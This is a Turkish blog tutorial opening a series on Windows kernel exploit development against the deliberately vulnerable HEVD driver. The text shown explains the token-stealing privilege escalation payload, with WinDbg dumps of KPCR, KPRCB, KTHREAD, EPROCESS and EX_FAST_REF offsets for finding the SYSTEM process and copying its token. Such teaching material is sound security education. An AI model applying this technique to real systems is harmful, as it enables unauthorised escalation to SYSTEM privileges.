---
title: Windows Çekirdeğini Çıtlatıyoruz - Yığın Taşması
categories: Bilgisayar
---

Selamlar. Bu yazı tahminimce en az 4, en fazla 7 yazıdan oluşan ve genel çerçeve olarak Windows çekirdeğinde "*exploit*"[^1] geliştirmekten bahseden bir yazı dizisinin ilk yazısı olacak inşallah. Yazı boyunca epey sevimli olan ve yabancı bir kardeşimizin hazırladığı [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) isimli sürücü üzerinden Windows çekirdeğini çitlemeyi hep birlikte öğrenmeye çalışacağız.

Bu yazılarda ön gereksinim olarak ihtiyacınız olan şeyler bir adet sanal makine, bu makineye bağlayabildiğiniz bir *Windbg* ve "*exploit*"leri yazmada rahat hissedebileceğiniz bir programlama dili olacak. Önceki yazılardan bir ikisinde Windows çekirdeğine nasıl hata ayıklayıcı bağlanır bundan bahsetmiştim (sanırım *Kancalama Sanatı* ile ilgili olan yazılardan birindeydi), dolayısıyla abesle iştigal olmaması açısından bu yazıda direkt olarak konuya giriş yapacağız. Fakat sakın üzülmeyin, zirâ mümkün mertebe dengeli bir şekilde, yani ne ifrata ne de tefrite bulaşmadan, doyurucu bir yazı dizisi hazırlamaya çalışacağım. Bu sayede bu teknik detaylarla aranızdan *Fight Club*'a girmeye hak kazananlar teker teker belli olacak hehe.


Tamam, şu anda kod çalıştırabileceğimiz bir duruma geldik. Peki ne çalıştıracağız? Mesela hatırlayın, kullanıcı modunda ne yapıyorduk? İşte hesap makinesi çalıştırıyorduk, uzaktan bağlantıya izin veren bir arka kapı çalıştırıyorduk. Ama şimdi çekirdek modundayız, yani tüm kalkanlar devrede hehe. O halde yetkimizi yükseltip yönetici olalım bakalım!

Bunun için öncelikle birazcık Windows mimarisinden bahsetmemiz gerekiyor. Tamam, yetki yükselteceğiz de nasıl? Şimdi, öncelikle yetki yükselterek yapmak istediğimiz şey, "*exploit*" olarak çalışan işlemin(veya bir başkasının) yetkilerinin sistem yetki seviyesine çekilmesi sağlamak. Windows işletim sisteminde işlemlerin yetki durumunu tanımlayan "**Token**" adı verilen bir nesne var -unutmayın, Windows çekirdeğinde hemen hemen her şey bir nesnedir-. Normal şartlar altında bizim kullanıcı modundan çalıştırılan işlemimiz, o anki kullanıcının sahip olduğu haklara göre çalıştırılıyor. Biz, gidip bir sistem işleminden onun yetkilerini tanımlayan "*Token*" nesnesini alıp, kendi işlemizin yetkilerini tanımlayan "*Token*" nesnesinin yerine koyacağız. Bu sayede sistem işleminde olan yetkiler bizim işlemize de geçmiş olacak. Oldukça kolay bir işlem, yapmak için genel hatlarıyla dört aşamayı gerçekleştirmemiz gerekiyor:

1. Sistem işleminin veri yapısını bul
2. Bu işlemin "Token" bilgisini al
3. Alınan "Token" bilgisini hedef işlemin "Token" alanına koy
4. Sistemi çökmekten kurtar!

### Biraz Windows Mimarisi

Öncelikle işletim sistemindeki işlemleri gezebilmemiz gerekiyor. Bunların hepsini bir "*shellcode*" içerisinden yapmalıyız. Windows işletim sistemindeki hemen hemen her işlem bir `EPROCESS`(Executive Process) veri yapısı ile tanımlanır. Bu yapı içerisinde o işleme ait işlemciklere, hafıza alanlarına ve işlem ile ilgili diğer tüm bilgilere ulaşabilirsiniz. Sistemdeki işlemleri gezebilmemiz için öncelikle bu işlemlerin tutulduğu herhangi bir yere erişim sağlamamız gerekiyor. Bunun için öncelikle işletim sistemindeki **KPCR** veri yapısına başvuracağız.

#### KPCR (Kernel Processor Control Region), KPRCB (Kernel Processor Control Block) ve EPROCESS
**KPCR**, Windows işletim sisteminde, sistemde bulunan her çekirdek için bir adet bulunan kritik veri yapılarından biridir. İşletim sistemi bu veri yapısında işlemcinin kesme işleme tablosu(*Interrupt Descriptor Table*), küresel tanımlayıcı(*Global Descriptor Table*) tablosu, geçerli Irql seviyesi, sistemin sürüm bilgisi gibi kritik verileri barındırır. Bu veri yapısı, kolayca erişebilmek için, 64 bit Windows işletim sisteminde her zaman `gs` segment göstericisi ile gösterilen alanın ilk baytında bulunur. (32 bit sistemlerde ise `fs` segment göstericisi ile bu veri yapısına ulaşabilirsiniz.) Yani `mov rax, gs:[0]` gibi bir işlem yaptığımızda bu veri yapısına ulaşabiliriz. İşlem listesine ulaşabilmek için şöyle bir yol izleyeceğiz : `KPCR.Prcb -> KPRCB.CurrentThread -> KTHREAD.ApcState -> KAPC_STATE.Process`. Bu yolu izlediğimizde şu anda çalıştırılmakta olan işlemin veri yapısına ulaşacağız demektir. Bilahare bu veri yapılarının hepsi birbirine bağlandığı için tüm işlemler arasından gezebiliyor olacağız. 

```
0: kd> dt _KPCR
ntdll!_KPCR
   +0x000 NtTib            : _NT_TIB
   +0x000 GdtBase          : Ptr64 _KGDTENTRY64
   +0x008 TssBase          : Ptr64 _KTSS64
   +0x010 UserRsp          : Uint8B
   +0x018 Self             : Ptr64 _KPCR
   +0x020 CurrentPrcb      : Ptr64 _KPRCB
   +0x028 LockArray        : Ptr64 _KSPIN_LOCK_QUEUE
   +0x030 Used_Self        : Ptr64 Void
   +0x038 IdtBase          : Ptr64 _KIDTENTRY64
   +0x040 Unused           : [2] Uint8B
   +0x050 Irql             : UChar
   +0x051 SecondLevelCacheAssociativity : UChar
   +0x052 ObsoleteNumber   : UChar
   +0x053 Fill0            : UChar
   +0x054 Unused0          : [3] Uint4B
   +0x060 MajorVersion     : Uint2B
   +0x062 MinorVersion     : Uint2B
   +0x064 StallScaleFactor : Uint4B
   +0x068 Unused1          : [3] Ptr64 Void
   +0x080 KernelReserved   : [15] Uint4B
   +0x0bc SecondLevelCacheSize : Uint4B
   +0x0c0 HalReserved      : [16] Uint4B
   +0x100 Unused2          : Uint4B
   +0x108 KdVersionBlock   : Ptr64 Void
   +0x110 Unused3          : Ptr64 Void
   +0x118 PcrAlign1        : [24] Uint4B
   +0x180 Prcb             : _KPRCB       ----> Dikkat
```

Windows çekirdeği ile ilgilenen biriyseniz, bu veri yapısındaki her girdi incelemeniz için sizi bekliyor haberiniz olsun :) Fakat şimdilik o çekici detayları geçelim ve işlem listesine ulaşmaya odaklanalım. Burada en son eleman olan **Prcb** elamanı bizim aradığımız arkadaş, dikkat edin `0x180` uzaklığında bulunuyor. **Prcb**, yine Windows işletim sisteminde geçerli işlemcinin kullandığı oldukça kritik verileri barındıran bir veri yapısı. Bu veri yapısının da her elemanı her Windows çekirdeği meraklısı için günlerce incelenebilecek cinsten, haberiniz olsun... Neyse, devamında **Prcb** içerisinde `0x8` uzaklığında bulunan `CurrentThread` alanı ile şu anda çalıştırılan işlemciğin(Thread) veri yapısına ulaşacağız.

```
0: kd> dt _KPRCB
ntdll!_KPRCB
   +0x000 MxCsr            : Uint4B
   +0x004 LegacyNumber     : UChar
   +0x005 ReservedMustBeZero : UChar
   +0x006 InterruptRequest : UChar
   +0x007 IdleHalt         : UChar
   +0x008 CurrentThread    : Ptr64 _KTHREAD  ----> Dikkat
   +0x010 NextThread       : Ptr64 _KTHREAD
   +0x018 IdleThread       : Ptr64 _KTHREAD
   +0x020 NestingLevel     : UChar
   +0x021 PrcbPad00        : [3] UChar
   +0x024 Number           : Uint4B
   +0x028 RspBase          : Uint8B
   +0x030 PrcbLock         : Uint8B
   +0x038 PrcbPad01        : Uint8B
   ...
   ...
```

Esasında, **Prcb** alanı, **Pcr** alanının içerisinde olduğu için `gs` segment göstericisinin gösterdiği alanda `0x180 + 0x8` uzaklığına gidersek şu anda çalıştırılan işlemciğin veri yapısına ulaşacağız demektir. Burada bizi `KTHREAD`(Kernel Thread) veri yapısı karşılayacak. Bu veri yapısı esasen `ETHREAD`(Executive Thread) denilen başka bir veri yapısının en başında bulunan bir veri yapısı. Windows çekirdeğinde bir çekirdek (kernel) bir de yönetim (executive) dedikleri iki ana katman vardır. Bunlardan ilki daha da alt seviyedeyken, ikinicisi biraz daha üstte bir katmandır, aklınızda bulunsun.

`KTHREAD` veri yapısına geldikten sonra bu veri yapısının içerisinden bu işlemciği kapsayan işleme ulaşmamız gerekiyor. Bunun için öncelikle `ApcState` (uzaklığı `0x50`) alanına ulaşacağız, devamında ise `KAPC_STATE` veri yapısı içerisinden `EPROCESS` veri yapısını alacağız. Bakınız:

```
0: kd> dt nt!_KTHREAD
   +0x000 Header           : _DISPATCHER_HEADER
   +0x018 CycleTime        : Uint8B
   +0x020 QuantumTarget    : Uint8B
   +0x028 InitialStack     : Ptr64 Void
   +0x030 StackLimit       : Ptr64 Void
   +0x038 KernelStack      : Ptr64 Void
   +0x040 ThreadLock       : Uint8B
   ...
   ...
   +0x050 ApcState         : _KAPC_STATE ----> Dikkat
   ...
   ...
   +0x330 OtherOperationCount : Int8B
   +0x338 ReadTransferCount : Int8B
   +0x340 WriteTransferCount : Int8B
   +0x348 OtherTransferCount : Int8B
   +0x350 ThreadCounters   : Ptr64 _KTHREAD_COUNTERS
   +0x358 StateSaveArea    : Ptr64 _XSAVE_FORMAT
   +0x360 XStateSave       : Ptr64 _XSTATE_SAVE

0: kd> dt nt!_KAPC_STATE
   +0x000 ApcListHead      : [2] _LIST_ENTRY
   +0x020 Process          : Ptr64 _KPROCESS --> Dikkat
   +0x028 KernelApcInProgress : UChar
   +0x029 KernelApcPending : UChar
   +0x02a UserApcPending   : UChar

```

Yine burada `0x50 + 0x20` yaparsak toplamda `0x70` uzaklığına gittiğimizde şimdiki işlemin `KPROCESS` veri yapısına ulaşacağız demektir. Ki, bu veri yapısı da söylediğimiz gibi `EPROCESS` veri yapısının en başında bulunan bir veri yapısı, dolayısıyla aynı zamanda işlemin `EPROCESS` yapısına da ulaşmış oluyoruz demektir bu. 

Araya ufak bir bilgi ekleyeyim, Windows çekirdeğinin içerisinde gezdikçe bu tür taklaları nasıl atabileceğinizi işletim sisteminin kendinden de öğrenebiliyorsunuz. Örneğin biz burada şu anda çalışan işlemin veri yapısına ulaşmak istedik değil mi? Mesela eğer sürücü geliştirmekle uğraştıysanız bilirsiniz ki `PsGetCurrentProcess` isimli fonksiyon size şu anda çalışmakta olan işlemin veri yapısını döndürür. Bu fonksiyonun nasıl çalıştığına bakarak mevcut işlemin veri yapısına nasıl ulaşabileceğinizi öğrenebilirsiniz, bakınız:

```assembly
3: kd> u nt!PsGetCurrentProcess
nt!PsGetCurrentProcess:
    fffff800`02ad8890 65488b042588010000 mov     rax,qword ptr gs:[188h]
    fffff800`02ad8899 488b4070           mov     rax,qword ptr [rax+70h]
```

Görüldüğü üzere, tam olarak bizim yapmayı planladığımız şeyi yapıyor (Aslında ben bu fonksiyonun nasıl çalıştığına bakıp ona göre "*shellcode*"u yazıyorum ama şimdi orayı karıştırmayın, hehe). O halde bu fonksiyonun bu ilk iki satırını (ki zaten toplam 3 satır) kullanabiliriz ileride. Burada aklıma gelmişken söyleyeyim, unutmamanız gereken şey, bu veri yapılarının alanlarının uzunlukları sürümden sürüme değişebiliyor. O nedenle Windows 7'de çalışan "*shellcode*" diğer sürümlerde çalışmayabilir. Siz hangi işletim sistemi için "*exploit*"i geliştiriyorsanız, o sistemdeki uzaklık değerlerini kullanmalısınız.

Şimdi ise geldik işin cavcaklı kısmına. `EPROCESS` veri yapısında bu "*shellcode*"u yazarken ihtiyacımız olan üç adet şey var. Bunlar sırasıyla **UniqueProcessId**, **ActiveProcessLinks** ve **Token** elemanları. İsimleri zaten az çok ne olduklarını anlatıyor.

```
0: kd> dt _EPROCESS
ntdll!_EPROCESS
   +0x000 Pcb              : _KPROCESS
   +0x160 ProcessLock      : _EX_PUSH_LOCK
   +0x168 CreateTime       : _LARGE_INTEGER
   +0x170 ExitTime         : _LARGE_INTEGER
   +0x178 RundownProtect   : _EX_RUNDOWN_REF
   +0x180 UniqueProcessId  : Ptr64 Void       ----> İlk dostumuz (0x180)
   +0x188 ActiveProcessLinks : _LIST_ENTRY    ----> İkinci dostumuz (0x188)
   ...
   ...
   +0x208 Token            : _EX_FAST_REF     ----> Üçüncü dostumuz (0x208)
   +0x210 WorkingSetPage   : Uint8B
   +0x218 AddressCreationLock : _EX_PUSH_LOCK
   ...
   ...
```

`ActiveProcessLinks` alanı gördüğünz gibi bir `LIST_ENTRY` veri yapısı. Bu ise iyi haber demek, lakin bu eleman sistemde bulunan tüm işlemleri birbirine bağlıyor. Bu sayede işlemler arasında hızlıca gezebiliyoruz. Burada bilmemiz gereken şeylerden biri "*Token*" bilgisini alacağımız işlemin belirteç değeri. Ki, o da çok uzun bir zamandır **4** değeri ile belirtiliyor. Bu durumda işlem listesini gezerek `UniqueProcessId` alanı **4** olan bir veri yapısını arayacağız demektir. Üstteki çıktıda normalde `Token` elemanı `TOKEN` veri tipi ile tanımlanıyor. Fakat burada 64 bit Windows'a özgü bir takla atılmış ona da kısaca değinelim. Burada `Token` elemanı `EX_FAST_REF` veri yapısı ile tanımlanmış. Bu veri yapısı şu şekilde:

```
3: kd> dt _EX_FAST_REF 
ntdll!_EX_FAST_REF
   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits
   +0x000 Value            : Uint8B
```

Bunu yapıyorlar çünkü 64 bit sistemde veri yapıların16 bayt değerine göre hizalanıyor. Bu nedenle çekirdek modundaki herhangi bir veri yapısına olan göstericinin son 4 biti her zaman 0 oluyor. Windows bu yoksayılan 4 biti ise bu nesneye yapılan referans sayılarını tutmak için kullanıyor.

```
0: kd> dt _EX_FAST_REF 0xfffffa8003d10248
ntdll!_EX_FAST_REF
   +0x000 Object           : 0xfffff8a0`00004bb8 Void
   +0x000 RefCnt           : 0y1000
   +0x000 Value            : 0xfffff8a0`00004bb8
```  

Burada `0xfffff8a000004bb8` değerinin son 4 bitini sıfırlarsak "*Token*" nesnesine ulaşabiliriz:

```
0: kd> !token (0xfffff8a0`00004bb8 & 0xffffffff`fffffff0)
_TOKEN 0xfffff8a000004bb0
TS Session ID: 0
User: S-1-5-18
User Groups: 
 00 S-1-5-32-544
    Attributes - Default Enabled Owner 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-11
    Attributes - Mandatory Default Enabled 
 03 S-1-16-16384
